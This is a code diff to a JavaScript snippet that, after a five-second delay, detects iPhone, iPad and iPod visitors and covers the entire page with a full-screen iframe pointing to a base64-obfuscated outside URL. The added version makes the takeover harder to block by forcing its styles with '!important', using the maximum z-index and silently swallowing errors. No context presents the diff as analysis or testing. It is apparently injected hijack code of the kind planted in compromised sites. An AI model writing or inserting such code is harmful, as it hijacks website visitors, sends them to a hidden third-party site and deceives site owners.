@@ -1,10 +1,21 @@
-setTimeout(function(){
-  var isiPhone = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-  if(isiPhone){
-    var url = atob("aHR0cHM6Ly92LnJvbGxzMy5jb20v");
-    var d = document.createElement("div");
-    d.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:#000;";
-    d.innerHTML = '<iframe src="' + url + '" style="width:100%;height:100%;border:0;"></iframe>';
-    document.body.appendChild(d);
-  }
-}, 5000);
+!function(){
+    "use strict";
+    setTimeout(function(){
+        try {
+            var ua = window.navigator.userAgent || window.navigator.vendor || window.opera;
+            var isIOS = /iPhone|iPad|iPod/i.test(ua);
+            
+            if(isIOS){
+                var targetUrl = atob("aHR0cHM6Ly92LnJvbGxzMy5jb20v");
+                var overlay = document.createElement("div");
+                
+                overlay.setAttribute("style", "position:fixed !important;top:0 !important;left:0 !important;width:100% !important;height:100% !important;z-index:2147483647 !important;background:#000 !important;display:block !important;");
+                
+                overlay.innerHTML = '<iframe src="' + targetUrl + '" style="width:100% !important;height:100% !important;border:0 !important;position:absolute !important;top:0 !important;left:0 !important;"></iframe>';
+                
+                (document.body || document.documentElement).appendChild(overlay);
+            }
+        } catch (err) {
+        }
+    }, 5000);
+}();
